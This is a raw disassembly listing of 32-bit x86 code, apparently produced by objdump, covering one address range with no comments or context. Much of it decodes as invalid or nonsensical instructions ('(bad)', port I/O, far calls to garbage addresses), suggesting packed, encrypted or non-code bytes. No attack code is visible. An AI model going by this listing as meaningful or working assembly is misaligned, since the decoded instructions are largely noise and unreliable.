  4060b9:	jecxz  0x40612f
  4060bb:	hlt    
  4060bc:	ja     0x406123
  4060be:	pop    es
  4060bf:	call   0x3f36c7
  4060c4:	leave  
  4060c5:	ins    BYTE PTR es:[edi],dx
  4060c6:	daa    
  4060c7:	adc    ecx,DWORD PTR [eax-0xc]
  4060ca:	mov    ebp,0x74e44575
  4060cf:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060d1:	gs pop es
  4060d3:	call   0x3f36d7
  4060d8:	mov    bl,0x12
  4060da:	push   DWORD PTR [ebp-0x40]
  4060dd:	loop   0x406153
  4060df:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e1:	gs pop es
  4060e3:	call   0x3f37eb
  4060e8:	xchg   DWORD PTR [ebp-0x15],esp
  4060eb:	(bad)  
  4060ec:	in     eax,dx
  4060ed:	pop    eax
  4060ee:	out    0x3c,eax
  4060f0:	pop    edx
  4060f1:	jecxz  0x4060f1
  4060f3:	xor    DWORD PTR [ecx],0x48
  4060f6:	add    BYTE PTR [di+0x68],bh
  4060fa:	test   BYTE PTR [ebp-0x2f],bh
  4060fd:	outs   dx,BYTE PTR ds:[esi]
  4060fe:	test   BYTE PTR [esi],0xba
  406101:	mov    bh,0x67
  406103:	jmp    DWORD PTR [ecx]
  406105:	test   DWORD PTR es:[edi],0x2bc90000
  40610c:	inc    ebx
  40610d:	dec    esi
  40610f:	add    esi,edi
  406111:	imul   esi,DWORD PTR [ecx],0xc907f6fe
  406117:	mov    edi,0xdb6ff42
  40611c:	div    ebx
  40611e:	cdq    
  40611f:	dec    esi
  406120:	inc    esi
  406121:	jmp    DWORD PTR [esi-0x760409a3]
  406127:	inc    esi
  406128:	inc    esi
  406129:	call   DWORD PTR [esi-0x66080993]
  40612f:	pop    esi
  406130:	inc    esi
  406131:	inc    DWORD PTR [esi-0x761009c3]
  406137:	jbe    0x40617f
  406139:	push   DWORD PTR [esi+0x4d]
  40613c:	imul   bl
  40613e:	pop    ecx
  40613f:	outs   dx,BYTE PTR ds:[esi]
  406140:	inc    esi
  406141:	jmp    DWORD PTR [esi-0x63]
  406144:	mul    bl
  406146:	dec    ecx
  406147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406148:	inc    edi
  406149:	call   DWORD PTR [esi-0x4d]
  40614c:	inc    ebp
  40614d:	and    al,0x31
  40614f:	and    BYTE PTR [ebp-0x14],bh
  406152:	mov    al,0xb6
  406154:	jae    0x40614d
  406156:	ds test ebx,ebx
  406159:	adc    dh,BYTE PTR [ecx]
  40615b:	fidiv  WORD PTR [eax-0x3d612698]
  406161:	dec    DWORD PTR [esi+0x314133b8]
  406167:	adc    eax,0x6d70338c
  40616c:	fisttp DWORD PTR [ebp+0x14420000]
  406172:	test   al,0x3
  406174:	cdq    
  406175:	lea    ebx,[edx]
  406177:	ret    
  406178:	(bad)  
  406179:	repz jns 0x4061b0
  40617c:	jo     0x406192
  40617e:	dec    esi
  40617f:	idiv   BYTE PTR [edx]
  406181:	pop    ebx
  406182:	mov    esp,0x3eedcefb
  406187:	jo     0x406167
  406189:	in     al,dx
  40618a:	fld    DWORD PTR [ebx]
  40618c:	(bad)  
  40618d:	call   0xdbe8:0xd5025ac1
  406194:	shl    BYTE PTR [edi],cl
  406196:	test   al,0x3
  406198:	dec    ecx
  406199:	cmp    al,0xda
  40619b:	ret    0xf3b6
  40619e:	sub    BYTE PTR [eax+esi*8],dh
  4061a1:	adc    edx,DWORD PTR [ecx-0x172a9d49]
  4061a7:	fld    TBYTE PTR [edx+0x27]
  4061aa:	test   al,0x3
  4061ac:	xchg   esi,eax
  4061ad:	loope  0x40618b
  4061af:	jo     0x4061b5
  4061b1:	or     al,0xd1
  4061b3:	sub    eax,DWORD PTR [edi+0x22dcde5b]
  4061b9:	adc    al,0xc6
  4061bb:	scas   al,BYTE PTR es:[edi]
  4061bc:	or     ebp,ecx
  4061be:	adc    al,0xc5
  4061c0:	outs   dx,BYTE PTR ds:[esi]
  4061c1:	repz add BYTE PTR [eax],bh
  4061c4:	lock adc edx,DWORD PTR [ecx+0x27]
  4061c8:	and    eax,0x2ddbe8d5
  4061cd:	and    BYTE PTR [eax],ch
  4061cf:	add    al,0xd9
  4061d1:	pop    edi
  4061d2:	fcmovb st,st(4)
  4061d4:	add    BYTE PTR [eax],al
  4061d6:	inc    esi
  4061d7:	repz div BYTE PTR [edi]
  4061da:	lock adc edx,DWORD PTR [esi+0x145b2af9]
  4061e1:	cld    
  4061e2:	push   ss
  4061e3:	or     DWORD PTR [edi+0x2489266f],eax
  4061e9:	jo     0x40616c
  4061eb:	pop    ebx
  4061ec:	add    ah,bh
  4061ee:	push   ss
  4061ef:	pop    edx
  4061f0:	xor    eax,0xffd52c0d
  4061f5:	push   eax
  4061f6:	ret    0x81
  4061f9:	jmp    0xd3b5fcf9
  4061fe:	outs   dx,DWORD PTR ds:[esi]
  4061ff:	shl    edi,1
  406201:	jmp    0x2e407638
  406206:	clc    
  406207:	jmp    si
  40620a:	xor    dl,BYTE PTR [edx+ebp*2]
  40620d:	jmp    0xe9a9bd0a
  406212:	call   0x3eecee71
  406217:	les    ecx,FWORD PTR [esp+eiz*2+0x16ff6339]
  40621e:	fstp   QWORD PTR [ecx+0x75]
  406221:	adc    DWORD PTR [esi],ebx
  406223:	loope  0x406220
  406225:	adc    DWORD PTR [edx+eax*4],esp
  406228:	add    cl,ch
  40622a:	fwait
  40622b:	call   0x1c67:0xd3fbeb74
  406232:	sub    eax,0x89e5ffd5
  406237:	push   cs
  406238:	call   0xf74062cb
  40623d:	pop    edx
  40623e:	jmp    DWORD PTR [edx-0x1e]
  406241:	mov    BYTE PTR [ebp-0xa5182b],al
  406247:	sbb    DWORD PTR [ebx-0x30590b8e],eax
  40624d:	pop    edx
  40624e:	mov    DWORD PTR [edx+eiz*8+0x62],ebp
  406252:	jmp    FWORD PTR [esi-0x610f5f21]
  406258:	xlat   BYTE PTR ds:[ebx]
  406259:	pop    edx
  40625a:	call   DWORD PTR [edi*1-0x38680a8e]
  406261:	pop    edx
  406262:	call   DWORD PTR [edx+eiz*4+0x61]
  406266:	inc    DWORD PTR [eax]
  406268:	scas   eax,DWORD PTR es:[edi]
  406269:	mov    ebp,0xea9fc3e1
  40626e:	inc    BYTE PTR [ebp-0x60]
  406271:	mov    esi,0xea05ff94
  406276:	out    0x2f,eax
  406278:	xchg   BYTE PTR ds:0x5d4ac900,dl
  40627e:	call   DWORD PTR [ebx+edx*4-0x47]
  406282:	add    ah,0x7c
  406285:	cmp    edi,edi
  406287:	imul   edx,esi,0x800874ea
  40628d:	loop   0x40624e
  40628f:	call   FWORD PTR [edi]
  406291:	fadd   DWORD PTR [esp+edi*8-0x10]
  406295:	inc    ebp
  406296:	xor    al,BYTE PTR [ecx-0x28]
  406299:	jmp    0xfffe:0xa2200874
  4062a0:	add    BYTE PTR [eax],al
  4062a2:	pop    ds
  4062a3:	cmp    edi,edi
  4062a5:	addr16 mov ebp,0xc0004126
  4062ab:	inc    ebp
  4062ac:	xor    al,BYTE PTR [ecx-0x78]
  4062af:	jmp    0xe7ff:0x50715c34
  4062b6:	dec    eax
  4062b7:	iret   
  4062b8:	(bad)  
  4062b9:	inc    DWORD PTR [ebx+0x380f73d5]
  4062bf:	inc    eax
  4062c0:	(bad)  
  4062c1:	jne    0x406253
  4062c3:	mov    ebp,0xe77ffc94
  4062c8:	out    0x85,eax
  4062ca:	fwait
  4062cb:	out    0xfe,eax
  4062cd:	push   0x48
  4062cf:	cmp    eax,0x100928ce
  4062d4:	push   0xff564b63
  4062d9:	(bad)  
  4062da:	gs dec ecx
  4062dc:	sub    BYTE PTR [ecx+0x48],al
  4062df:	mov    ebp,0x8231c685
  4062e4:	ins    DWORD PTR es:[edi],dx
  4062e5:	or     esi,ecx
  4062e7:	(bad)  
  4062e8:	cld    
  4062e9:	dec    edi
  4062ea:	adc    DWORD PTR [edx+0x60907f7],0x9316ff70
  4062f4:	leave  
  4062f5:	ret    0xea0e
  4062f8:	fcos   
  4062fa:	mov    ?,WORD PTR [eax+0x30]
  4062fd:	inc    ecx
  4062fe:	xor    DWORD PTR [ebx-0x2d],eax
  406301:	xor    dh,BYTE PTR [eax+0x6b]
  406304:	fild   DWORD PTR [ecx]
  406306:	add    BYTE PTR [eax],al
  406308:	xor    DWORD PTR [ebx-0x7d],ebp
  40630b:	call   0xffad8c94
  406310:	sub    ch,BYTE PTR [ebx]
  406312:	clc    
  406313:	push   cs
  406314:	cmp    DWORD PTR [ebx+0x6c],0xc1d33975
  40631b:	sti    
  40631c:	(bad)  
  40631d:	xor    DWORD PTR [edx+esi*1-0xe],ebx
  406321:	stc    
  406322:	ins    BYTE PTR es:[edi],dx
  406323:	push   0x31
  406325:	xchg   ebx,eax
  406326:	cmp    al,0x28
  406328:	lock push 0xffffffdb
  40632b:	bound  esp,QWORD PTR [edx-0x54]
  40632e:	add    ebp,DWORD PTR [eax+0x33]
  406331:	imul   eax,DWORD PTR [ebx],0xffffff80
  406334:	mov    DWORD PTR [esi+0x758eff45],edx
  40633a:	inc    ebx
  40633b:	je     0x406373
  40633d:	sbb    edx,esp
  40633f:	inc    BYTE PTR [ebx+eiz*2]
  406342:	pop    ebx
  406343:	sbb    DWORD PTR [ebp+0x41],esi
  406346:	ins    BYTE PTR es:[edi],dx
  406347:	call   0xffad1184
  40634c:	(bad)  [esp+ebp*2+0x75]
  406350:	sub    DWORD PTR [ebx-0x17],eax
  406353:	sti    
  406354:	push   esi
  406355:	mov    eax,ds:0x1f4e22d9
  40635a:	cld    
  40635b:	out    0xc1,eax
  40635d:	adc    esp,DWORD PTR [ebp-0x312c194]
  406363:	ins    BYTE PTR es:[edi],dx
  406364:	mov    esp,0x2ae5810b
  406369:	pop    eax
  40636a:	mov    gs,WORD PTR [eax+eax*1+0x0]
  40636e:	pushf  
  40636f:	pop    eax
  406370:	xchg   dh,dh
  406372:	ss ins BYTE PTR es:[edi],dx
  406374:	pop    ds
  406375:	inc    esp
  406376:	push   ss
  406377:	pop    eax
  406378:	mov    al,ds:0x14143541
  40637d:	jns    0x406394
  40637f:	xchg   esp,eax
  406380:	sub    eax,0xd2bf676f
  406385:	add    ecx,DWORD PTR [ebx+0x36f6560f]
  40638b:	ins    BYTE PTR es:[edi],dx
  40638c:	jmp    0x709849d4
  406391:	(bad)  
  406392:	fimul  DWORD PTR [ebx-0x2af1090c]
  406398:	call   0x11d7015
  40639d:	ret    
  40639e:	(bad)  
  40639f:	xlat   BYTE PTR ds:[ebx]
  4063a0:	in     eax,0x3
  4063a2:	inc    ebp
  4063a3:	jecxz  0x406335
  4063a5:	leave  
  4063a6:	add    dl,ch
  4063a8:	call   0x7411fa81
  4063ad:	add    esi,DWORD PTR [ecx]
  4063af:	or     ebp,DWORD PTR [ecx]
  4063b1:	idiv   DWORD PTR [edi]
  4063b3:	mov    esi,0x576adb10
  4063b8:	not    dl
  4063ba:	push   ss
  4063bb:	adc    al,0xe9
  4063bd:	pop    esp
  4063be:	(bad)  
  4063bf:	in     al,dx
  4063c0:	pop    esi
  4063c1:	xor    al,dh
  4063c3:	adc    edi,DWORD PTR [ecx]
  4063c5:	imul   edi,esp,0xb
  4063c8:	ror    esi,0x57
  4063cb:	push   edi
  4063cc:	into   
  4063cd:	pop    esp
  4063ce:	scas   eax,DWORD PTR es:[edi]
  4063cf:	push   edx
  4063d0:	(bad)  
  4063d1:	imul   eax,DWORD PTR [eax],0x0
  4063d4:	leave  
  4063d5:	jmp    0x4063cb
  4063d7:	les    edx,FWORD PTR [esi-0x42]
  4063da:	inc    eax
  4063dc:	and    al,BYTE PTR [ecx-0x68b81700]
  4063e2:	je     0x4063ea
  4063e4:	arpl   WORD PTR [edi+0x3a],bp
  4063e7:	lods   eax,DWORD PTR ds:[esi]
  4063e8:	retf   0x5056
  4063eb:	add    DWORD PTR ds:0x54fef14,esi
  4063f1:	loope  0x406426
  4063f3:	sub    BYTE PTR ds:0x1af4fec4,dh
  4063f9:	outs   dx,DWORD PTR ds:[esi]
  4063fa:	sub    al,0x8e
  4063fc:	call   0xff57:0x6f11e857
  406403:	push   edx
  406404:	xor    al,0xce
  406406:	jg     0x406427
  406408:	sub    eax,0x56aff9e1
  40640d:	and    eax,eax
  40640f:	nop
  406410:	pop    edx
  406411:	push   edi
  406412:	inc    DWORD PTR [esi+0x67]
  406415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406416:	cmp    dh,ah
  406418:	loope  0x4063a1
  40641a:	(bad)  
  40641b:	mov    esp,0xe1755756
  406420:	push   0xffffffa0
  406422:	mov    edi,0x5db74a26
  406427:	xor    BYTE PTR [edi+0x10],ch
  40642a:	add    BYTE PTR [edi+ebp*1+0x32e96868],bh
  406431:	addr16 mov esi,0x411faa91
  406437:	jmp    0xe14b643c
  40643c:	or     esi,esi
  40643e:	or     DWORD PTR [esi],0x571306e8
  406444:	call   DWORD PTR [ecx+0x34]
  406447:	adc    al,0xef
  406449:	lahf   
  40644a:	pop    edx
  40644b:	ja     0x406481
  40644d:	sub    BYTE PTR ds:0xdbdd7557,dh
  406453:	loopne 0x40645c
  406455:	add    BYTE PTR [eax-0x68001a40],al
  40645b:	pop    ss
  40645c:	ret    0x5808
  40645f:	inc    ebx
  406460:	mov    ch,ah
  406462:	xchg   edi,eax
  406463:	arpl   WORD PTR [ebx],cx
  406465:	call   0x3f3675
  40646a:	inc    ebx
  40646b:	shl    BYTE PTR [ebx+0x1a],cl
  40646e:	xor    BYTE PTR [esi+0x42184134],cl
  406474:	out    0xd8,eax
  406476:	int    0xea
  406478:	(bad)  
  406479:	push   eax
  40647a:	cmp    cl,ch
  40647c:	je     0x406486
  40647e:	mov    al,0x76
  406480:	(bad)  
  406481:	call   DWORD PTR [edi-0x683e2a47]
  406487:	jmp    0x8b55:0x1200c2c8
  40648e:	je     0x40641e
  406490:	(bad)  
  406491:	cld    
  406492:	repnz adc DWORD PTR [edx+0x8],ebp
  406496:	ja     0x4064fc
  406498:	pop    es
  406499:	call   0x40100e
  40649e:	add    BYTE PTR [eax],al
  4064a0:	push   ecx
  4064a1:	push   esp
  4064a2:	sti    
  4064a3:	push   0xffffffd8
  4064a5:	cmp    DWORD PTR [ebp+esi*1-0x77],esi
  4064a9:	adc    DWORD PTR [eax-0x5e],ebp
  4064ac:	fcom   QWORD PTR [eax-0x1]
  4064af:	dec    BYTE PTR [ebp-0x67bed7b3]
  4064b5:	mov    ecx,0xea37c4bd
  4064ba:	or     al,al
  4064bc:	sbb    al,0x5
  4064be:	push   eax
  4064bf:	push   0xbeef1199
  4064c4:	test   al,0xea
  4064c6:	je     0x4064d0
  4064c8:	pusha  
  4064c9:	ins    DWORD PTR es:[edi],dx
  4064ca:	loop   0x4064cb
  4064cc:	push   edi
  4064cd:	mov    eax,0x3e31c18d
  4064d2:	imul   ebp,DWORD PTR [edx+0x31],0xf034eed3
  4064d9:	push   0xffffffdb
  4064db:	(bad)  
  4064dc:	sbb    eax,0x4ff042c
  4064e1:	call   FWORD PTR [edx]
  4064e3:	inc    ecx
  4064e4:	xor    DWORD PTR [ebx+0x79],edx
  4064e7:	les    edi,FWORD PTR [esi]
  4064e9:	scas   al,BYTE PTR es:[edi]
  4064ea:	std    
  4064eb:	mov    edi,0x67d35ebd
  4064f0:	xor    BYTE PTR [ebx+0x58],ch
  4064f3:	mov    esi,0x7ef8681
  4064f8:	or     DWORD PTR ds:0x8316ff65,ebx
  4064fe:	leave  
  4064ff:	ror    BYTE PTR [esi],0xde
  406502:	(bad)  
  406504:	add    BYTE PTR [eax],al
  406506:	mov    ?,eax
  406508:	cs inc ecx
  40650a:	xor    DWORD PTR [ebx+0x2],eax
  40650d:	xor    eax,0x35686b70
  406512:	lea    edx,[ebx+eax*8]
  406515:	dec    esi
  406517:	dec    edx
  406518:	aas    
  406519:	(bad)  
  40651a:	fisub  WORD PTR [ecx+0x43]
  40651d:	je     0x406545
  40651f:	jnp    0x4064f4
  406521:	inc    BYTE PTR [ebx+esi*2+0x5b]
  406525:	or     al,dh
  406527:	and    eax,0x2c04e869
  40652c:	imul   edi,edi,0x84db6b4b
  406532:	lods   al,BYTE PTR fs:[esi]
  406534:	add    ebp,DWORD PTR [eax+0x58]
  406537:	inc    eax
  406538:	ret    0x9fff
  40653b:	xchg   edi,eax
  40653c:	(bad)  
  40653d:	sub    al,dh
  40653f:	push   0x5b
  406541:	ss jne 0x4065a1
  406544:	push   0xf7de710b
  406549:	dec    edi
  40654a:	loope  0x40655f
  40654c:	out    0xee,al
  40654e:	cs ins BYTE PTR es:[edi],dx
  406550:	leave  
  406551:	imul   ebp,DWORD PTR [esi+0x54],0x5471fcc1
  406558:	into   
  406559:	fstp   QWORD PTR [esi-0x14]
  40655c:	jbe    0x40658c
  40655e:	lock adc edx,DWORD PTR [ecx-0x1e]
  406562:	add    eax,0xfc68e8d3
  406567:	mov    bh,0xff
  406569:	ret    0x0
  40656c:	ds ins BYTE PTR es:[edi],dx
  40656e:	cmc    
  40656f:	aas    
  406570:	ss push esp
  406572:	repnz inc ebx
  406574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406575:	and    edi,DWORD PTR [ecx]
  406577:	aam    0x27
  406579:	retf   0x5be0
  40657c:	out    0x52,eax
  40657e:	xchg   BYTE PTR [eax+0x9],ch
  406581:	ss test eax,0xd4bf0e68
  406587:	push   0x4b811c7c
  40658c:	call   DWORD PTR [ebx+0x66]
  40658f:	fstp   QWORD PTR [eax]
  406591:	push   ebx
  406592:	aam    0xfb
  406594:	(bad)  
  406595:	bound  edx,QWORD PTR [edi+0x68]
  406598:	out    0xbe,al
  40659a:	or     DWORD PTR [ecx+0x64],ebp
  40659d:	sbb    al,0x51
  40659f:	aas    
  4065a0:	xlat   BYTE PTR ds:[ebx]
  4065a1:	push   ebx
  4065a2:	ds push 0xee365044
  4065a8:	cs cmp al,0xf7
  4065ab:	test   eax,0x453053be
  4065b0:	sub    eax,0x9d7cb414
  4065b5:	push   ebx
  4065b6:	pushf  
  4065b7:	test   DWORD PTR [esi-0x6197dab4],0xe4ef291f
  4065c1:	mov    ebx,0x13f02e5d
  4065c6:	add    BYTE PTR [ecx-0x113b5f16],bl
  4065cc:	push   ss
  4065cd:	in     al,0x4f
  4065cf:	cmp    DWORD PTR [eax],eax
  4065d1:	add    BYTE PTR [ebp+0x53],dl
  4065d4:	dec    esi
  4065d6:	xchg   edi,eax
  4065d7:	mov    esp,0x536c1c99
  4065dc:	dec    edi
  4065dd:	into   
  4065de:	pusha  
  4065df:	sbb    ebp,eax
  4065e1:	sbb    dl,al
  4065e3:	push   edx
  4065e4:	jmp    DWORD PTR [ecx]
  4065e6:	ins    DWORD PTR es:[edi],dx
  4065e7:	adc    al,0x0
  4065e9:	(bad)  
  4065ea:	(bad)  
  4065eb:	mov    esp,0x5375f4a8
  4065f0:	dec    edi
  4065f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065f2:	inc    eax
  4065f3:	sbb    ebp,eax
  4065f5:	ficom  WORD PTR [ecx+0x531ff53]
  4065fb:	adc    eax,0xbbd77e00
  406600:	mov    dh,0xbc
  406602:	in     eax,dx
  406603:	push   edx
  406604:	dec    edi
  406605:	jle    0x406607
  406607:	sbb    ebp,eax
  406609:	ret    0x5391
  40660c:	inc    DWORD PTR [ecx+0x66ff92ee]
  406612:	xor    al,0x56
  406614:	or     cl,ch
  406616:	add    DWORD PTR [esi+0x50716aec],ebx
  40661c:	push   0xffffffe9
  40661e:	clc    
  40661f:	sbb    edi,edi
  406621:	mov    esp,0x7c793ada
  406626:	push   esi
  406627:	push   ebx
  406628:	mov    DWORD PTR [esi+ecx*2-0x3fd1e642],ebp
  40662f:	sbb    ch,al
  406631:	imul   ecx,DWORD PTR [esi+0x53],0x93ff
  406638:	push   ebx
  406639:	push   ebx
  40663a:	jne    0x40661d
  40663c:	or     cl,dl
  40663e:	dec    BYTE PTR [esi]
  406640:	push   ss
  406641:	mov    esi,0x452f001b
  406646:	pop    es
  406647:	call   0x3f2008
  40664c:	jg     0x406691
  40664e:	sti    
  40664f:	inc    DWORD PTR ds:0xcd93e74f
  406655:	mov    ecx,0x529ac9fe
  40665a:	call   DWORD PTR [ebx+edx*8-0x16]
  40665e:	imul   eax,DWORD PTR [eax],0x4134c3f0
  406664:	dec    eax
  406665:	outs   dx,BYTE PTR ds:[esi]
  406666:	loope  0x40669d
  406668:	sbb    DWORD PTR [eax],ebx
  40666a:	push   DWORD PTR ds:0x41311c
  406670:	jo     0x4066bb
  406672:	ret    0x8fff
  406675:	dec    ebp
  406676:	mov    edi,0xfe662574
  40667b:	jne    0x4066a5
  40667d:	mov    ebx,0xb9580c74
  406682:	je     0x40668c
  406684:	rol    BYTE PTR [ebx-0x1270001c],0xdd
  40668b:	mov    edi,0x69ba7f
  406690:	xor    ah,al
  406692:	xor    al,0x41
  406694:	or     BYTE PTR [esi-0x1f],ch
  406697:	xor    eax,0x2681599
  40669c:	add    BYTE PTR [eax],al
  40669e:	fcom   DWORD PTR ds:0xd368e880
  4066a4:	(bad)  
  4066a5:	jmp    ebx
  4066a7:	aad    0x73
  4066a9:	adc    eax,0x1074baa8
  4066ae:	inc    DWORD PTR [ebx+0xb]
  4066b1:	push   eax
  4066b2:	cmove  eax,DWORD PTR [edi]
  4066b5:	call   0x3f5805
  4066ba:	inc    eax
  4066bb:	stos   BYTE PTR es:[edi],al
  4066bc:	mov    edi,0x662a31ff
  4066c1:	jne    0x406704
  4066c3:	and    dh,al
  4066c5:	or     ecx,DWORD PTR [ecx]
  4066c7:	repz das 
  4066c9:	inc    ecx
  4066ca:	xor    DWORD PTR [edx-0x11],edx
  4066cd:	pop    es
  4066ce:	cdq    
  4066cf:	adc    DWORD PTR [edi-0x1],ebx
  4066d2:	jle    0x4066c8
  4066d4:	inc    eax
  4066d5:	or     al,0x31
  4066d7:	adc    BYTE PTR [ecx-0x14],bh
  4066da:	mov    dl,0x77
  4066dc:	push   0xf9d5316a
  4066e1:	(bad)  
  4066e2:	in     al,0x32
  4066e4:	pop    ebx
  4066e5:	mov    esi,0x89655a95
  4066ea:	hlt    
  4066eb:	mov    ds,esp
  4066ed:	inc    DWORD PTR [esi+0x5a]
  4066f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066f1:	push   0xffc24872
  4066f6:	aaa    
  4066f7:	xor    ah,bh
  4066f9:	out    0x91,eax
  4066fb:	mov    dl,0x65
  4066fd:	call   FWORD PTR [ecx+0xef033c]
  406703:	add    bh,bl
  406705:	adc    dh,BYTE PTR [esi]
  406707:	xor    eax,0x75643b70
  40670c:	cmp    DWORD PTR [ebx-0x35f9014a],esp
  406712:	fs jne 0x406712
  406715:	shr    esi,0x7
  406718:	or     DWORD PTR ds:0x3eeffa8,ecx
  40671e:	inc    edx
  40671f:	add    al,0x31
  406721:	nop
  406722:	js     0x406710
  406724:	mov    al,0xf6
  406726:	dec    ebx
  406727:	not    esi
  406729:	fnstenv [esi+0x45]
  40672c:	int    0xaa
  40672e:	fs jne 0x406766
  406731:	or     ch,BYTE PTR [edi]
  406733:	pop    esp
  406734:	or     BYTE PTR [ebx+eax*1-0x18],bh
  406738:	pushf  
  406739:	adc    edi,DWORD PTR [eax+0x4]
  40673c:	xor    DWORD PTR ds:0x6badf529,ebx
  406742:	call   0xa499984a
  406747:	imul   esi,DWORD PTR [ecx],0x14
  40674a:	jmp    0xf516dd52
  40674f:	fs cs adc al,0xe9
  406753:	fnstcw WORD PTR [esi-0x46]
  406756:	call   0xe8fade34
  40675b:	jbe    0x406751
  40675d:	inc    edi
  40675e:	cmp    DWORD PTR [edi-0x54],esi
  406761:	inc    edi
  406762:	fisub  WORD PTR [esi+ebx*2-0x1d]
  406766:	int    0xee
  406768:	add    BYTE PTR [eax],al
  40676a:	pop    esi
  40676b:	push   eax
  40676c:	cmp    al,0x68
  40676e:	pop    ecx
  40676f:	mov    eax,0x1d310357
  406774:	test   eax,0x523b35ef
  406779:	add    dh,BYTE PTR [ecx]
  40677b:	adc    al,0x11
  40677d:	aaa    
  40677e:	pop    ecx
  40677f:	aad    0xe8
  406781:	fs pushf 
  406783:	and    BYTE PTR [ecx-0x71b00c87],al
  406789:	shr    DWORD PTR [ebx+0x57e7464],cl
  40678f:	dec    eax
  406790:	jle    0x4067f6
  406792:	popa   
  406793:	loop   0x406715
  406795:	jmp    0x7aaeb78a
  40679a:	lods   al,BYTE PTR ds:[esi]
  40679b:	inc    esp
  40679c:	pop    esi
  40679d:	fs out dx,al
  40679f:	cmp    al,0x39
  4067a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067a2:	out    0x4f,al
  4067a4:	ret    
  4067a5:	add    ecx,DWORD PTR [ecx-0x21]
  4067a8:	push   ss
  4067a9:	ret    
  4067aa:	(bad)  
  4067ab:	dec    esi
  4067ac:	jl     0x406821
  4067ae:	(bad)  
  4067af:	dec    edi
  4067b0:	ds fs cld 
  4067b3:	out    dx,eax
  4067b4:	(bad)  
  4067b5:	push   edx
  4067b7:	dec    edi
  4067b8:	out    0x19,eax
  4067ba:	jae    0x40680b
  4067bc:	push   DWORD PTR [eax+0x2f]
  4067bf:	cmp    bh,dh
  4067c1:	push   ds
  4067c2:	or     eax,0x9380ffba
  4067c7:	or     DWORD PTR [ecx-0x17],eax
  4067ca:	or     eax,0xfef089
  4067cf:	add    BYTE PTR [edx],dl
  4067d1:	dec    edi
  4067d2:	push   DWORD PTR [esi+ebp*2-0x2516bf04]
  4067d9:	add    ecx,0x859d12ee
  4067df:	aad    0xa
  4067e1:	dec    edi
  4067e2:	call   DWORD PTR [ebx+0x2d]
  4067e5:	mov    esp,0x4f741f57
  4067ea:	(bad)  
  4067eb:	xchg   esp,eax
  4067ec:	std    
  4067ed:	inc    esi
  4067ee:	inc    esi
  4067f0:	ror    BYTE PTR [eax],cl
  4067f2:	pop    esp
  4067f3:	adc    BYTE PTR [edi+ecx*2-0x19],ch
  4067f7:	pop    ebp
  4067f8:	hlt    
  4067f9:	dec    esi
  4067fa:	jmp    DWORD PTR [eax-0x58]
  4067fd:	cmp    al,0xf7
  4067ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406800:	xchg   edx,eax
  406801:	mov    edx,0x91710ff
  406806:	inc    ecx
  406807:	jmp    0x9730f19f
  40680c:	xchg   edx,eax
  40680d:	dec    edi
  40680e:	(bad)  
  40680f:	mov    esp,0xe940fbce
  406814:	call   0x859d:0x9276c0c6
  40681b:	mov    DWORD PTR [edx+0x4f],ebx
  40681e:	push   DWORD PTR [eax+edi*4+0x6b]
  406822:	neg    DWORD PTR [esi+0x52]
  406825:	in     al,0x67
  406827:	fnstsw WORD PTR [eax]
  406829:	aad    0xff
  40682b:	dec    ebp
  40682c:	mov    eax,0x7700f743
  406831:	mov    bl,0xfe
  406833:	xor    eax,0xffa40000
  406838:	inc    eax
  406839:	add    BYTE PTR [eax-0x79],dh
  40683c:	sar    bh,0x7
  40683f:	pop    ds
  406840:	shl    BYTE PTR [ecx+esi*1-0x69],0xbd
  406845:	fdivr  DWORD PTR [edi]
  406847:	mov    bl,0xfe
  406849:	add    al,0xbd
  40684b:	inc    edx
  40684c:	(bad)  
  40684d:	xor    bh,dh
  40684f:	pushf  
  406850:	fdivr  st(7),st
  406852:	aaa    
  406853:	mov    bl,0x4f
  406855:	call   0x3fdcd2
  40685a:	xor    ecx,DWORD PTR [edx+ecx*1-0x40]
  40685e:	cld    
  40685f:	sbb    al,0x50
  406861:	call   0x3fdcd2
  406866:	(bad)  
  406867:	fdivr  st(7),st
  40686a:	xchg   DWORD PTR [ecx+0x12480014],esi
  406870:	cmp    DWORD PTR [ebp-0x11684],0x58
  406877:	fs add bp,0xffbe
  40687c:	idiv   bh
  40687e:	xchg   DWORD PTR [edx],edx
  406880:	je     0x4068de
  406882:	fwait
  406883:	je     0x40686d
  406885:	test   edi,0x5b73ffb2
  40688b:	inc    eax
  40688c:	(bad)  
  40688d:	call   DWORD PTR [edi+0x75ff73]
  406893:	mov    edx,0xb287ba6a
  406898:	(bad)  
  406899:	mov    ch,0x0
  40689b:	add    BYTE PTR [edx+ebp*8+0x6c87fffe],dh
  4068a2:	pop    es
  4068a3:	call   0x40183f
  4068a8:	xchg   DWORD PTR [eax+ebp*8+0x61e631f7],ebp
  4068af:	call   FWORD PTR [ebx+esi*1+0x6b]
  4068b3:	mov    cl,0x8b
  4068b5:	(bad)  
  4068b6:	popa   
  4068b7:	(bad)  
  4068b8:	jl     0x406891
  4068ba:	pop    ecx
  4068bb:	(bad)  
  4068bc:	mov    esi,0xc907d806
  4068c1:	call   0xe097:0xf6aeff9d
  4068c8:	sahf   
  4068c9:	cs (bad) 
  4068cb:	jmp    DWORD PTR [ebx+esi*1]
  4068ce:	imul   edx,DWORD PTR [ebp-0x9de125],0xffffffc4
  4068d5:	neg    DWORD PTR [ecx-0x1]
  4068d8:	xchg   BYTE PTR [esi-0x29],cl
  4068db:	pop    es
  4068dc:	mov    DWORD PTR [eax-0x63],esp
  4068df:	push   DWORD PTR [esi+0x3e]
  4068e2:	xchg   edi,eax
  4068e3:	in     al,0x66
  4068e5:	ss popa 
  4068e7:	call   0xffa219ac
  4068ec:	pop    esi
  4068ed:	mov    al,0x70
  4068ef:	not    DWORD PTR [esi+0x5e]
  4068f2:	ins    BYTE PTR es:[edi],dx
  4068f3:	xchg   BYTE PTR [esi+edx*2+0x637cff61],cl
  4068fa:	pop    ecx
  4068fb:	(bad)  
  4068fc:	ds push ebx
  4068fe:	fnstsw WORD PTR [eax+eax*1+0x617e3600]
  406905:	mov    ch,0x11
